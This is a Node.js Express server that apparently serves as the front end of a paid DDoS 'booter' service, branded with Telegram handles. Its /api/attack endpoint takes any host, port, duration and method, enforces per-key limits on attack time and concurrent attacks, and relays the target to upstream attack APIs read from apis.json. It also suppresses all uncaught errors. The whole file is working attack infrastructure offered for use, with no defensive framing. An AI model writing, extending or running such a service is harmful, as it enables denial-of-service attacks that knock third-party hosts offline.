const express = require("express");
const http = require("http");
const axios = require("axios");
const fs = require("fs");
const app = express();
const allapis = JSON.parse(fs.readFileSync("apis.json"));
const apiKeys = JSON.parse(fs.readFileSync("api_keys.json"));

const activeAttacks = {};

app.get("/", (req, res) => {
  res.status(401).json({ error: true, message: "Telegram: t.me/fbicat [Upgraded by t.me/tcpsec]" });
});

app.get("/api/attack", async (req, res) => {
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;
  const method = req.query.method;
  const apiKey = req.query.key;

  if (!(host && port && time && method && apiKey))
    return res.send({ error: true, message: "Missing parameters." });

  const apiLimits = apiKeys[apiKey];

  if (!apiLimits)
    return res.send({ error: true, message: "Invalid API key." });

  if (apiLimits.maxAttackTime < parseInt(time))
    return res.send({ error: true, message: "Attack time exceeds limit." });

  const currentTime = new Date().getTime();
  const activeAttacksForApiKey = activeAttacks[apiKey] || [];
  activeAttacksForApiKey.filter(
    (attack) => currentTime - attack.startTime < attack.duration
  );

  if (apiLimits.maxConcurrentAttacks <= activeAttacksForApiKey.length)
    return res.send({
      error: true,
      message: "Concurrent attacks limit exceeded.",
    });

  if (apiLimits.powersaving) {
    const existingAttack = activeAttacksForApiKey.find(
      (attack) => attack.target === host
    );
    if (existingAttack)
      return res.send({
        error: true,
        message: "An attack on this target is already in progress.",
      });
  }
  
  activeAttacksForApiKey.push({
    startTime: currentTime,
    duration: parseInt(time    * 1000),
    target: host,
  });

  activeAttacks[apiKey] = activeAttacksForApiKey;

  if (!allapis[method])
    return res.send({ error: true, message: "Invalid method." });

  const apiUrls = Array.isArray(allapis[method].api)
    ? allapis[method].api
    : [allapis[method].api];

  const attackPromises = apiUrls.map((apiUrl) => {
    const replacedUrl = apiUrl
      .replace("<<$host>>", host)
      .replace("<<$port>>", port)
      .replace("<<$time>>", time);
    return axios.get(replacedUrl);
  });

  try {
    const attackResults = await Promise.all(attackPromises);
    res.send({ success: true, results: attackResults.map((r) => r.data) });
  } catch (error) {
    res.send({ error: true, message: "Failed to send attack requests." });
  }
});

app.listen("1337", () => {
  console.log(`Example app listening on port 1337`);
});

process.on("uncaughtException", (err) => (""));
process.on("unhandledRejection", (err) => (""));  